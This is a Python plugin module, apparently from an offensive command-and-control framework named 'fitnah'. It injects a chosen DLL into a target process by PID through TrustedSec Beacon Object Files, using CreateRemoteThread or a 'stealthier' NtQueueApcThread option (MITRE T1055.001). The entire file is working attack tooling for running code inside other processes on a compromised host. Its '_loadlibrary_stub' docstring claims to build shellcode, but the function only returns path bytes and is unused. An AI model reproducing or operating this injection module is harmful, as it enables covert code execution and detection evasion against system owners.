"""execution/dll_inject — DLL injection via CreateRemoteThread or NtQueueApcThread. MITRE T1055.001

Native in-process BOF dispatch — no PowerShell, no child process.
BOF: TrustedSec/CS-Remote-OPs-BOF  (createremotethread | ntqueueapcthread)
Args: "ib" — int32 pid, bytes shellcode (LoadLibrary stub that loads the DLL)
"""
import base64
import struct
from pathlib import Path

from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


def _loadlibrary_stub(dll_path: str) -> bytes:
    """
    Build a minimal x64 LoadLibraryA shellcode stub for the given DLL path.
    Layout: push rsp-aligned stack, mov rcx=&path, call LoadLibraryA
    We embed the path string after the stub and patch the offset at runtime
    inside the BOF — so here we just encode the DLL path as a null-terminated
    UTF-8 blob and prepend a 0-byte header that tells the BOF it's a path, not
    raw shellcode.  The BOF's createremotethread/ntqueueapcthread variants load
    the DLL by calling LoadLibraryA with the path written into remote memory.
    """
    path_bytes = (dll_path + "\x00").encode("utf-8")
    return path_bytes


class DllInject(BasePlugin):
    NAME        = "dll_inject"
    DESCRIPTION = "Inject DLL into target process via native BOF (no PowerShell). method=crt or apc."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055.001"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("pid",      int, required=True,  help="Target process PID"),
        Param("dll_path", str, required=True,  help="Full path to DLL on target"),
        Param("method",   str, required=False, default="crt",
              help="crt (CreateRemoteThread) | apc (NtQueueApcThread, stealthier)"),
    )

    @mitre("T1055.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        pid      = int(params["pid"])
        dll_path = params["dll_path"]
        method   = params.get("method", "crt").lower()
        if method not in ("crt", "apc"):
            return ModuleResult.err("method must be 'crt' or 'apc'")

        bof_name = "createremotethread" if method == "crt" else "ntqueueapcthread"

        # Pack args: int32 pid + bytes (DLL path as LoadLibraryA target)
        dll_bytes = (dll_path + "\x00").encode("utf-8")
        args_b64  = ctx.bof_pack("ib", pid, dll_bytes)

        r = ctx.bof(bof_name, args_b64=args_b64, timeout=30)
        if r["status"] != "ok":
            return ModuleResult.err(f"dll_inject BOF failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
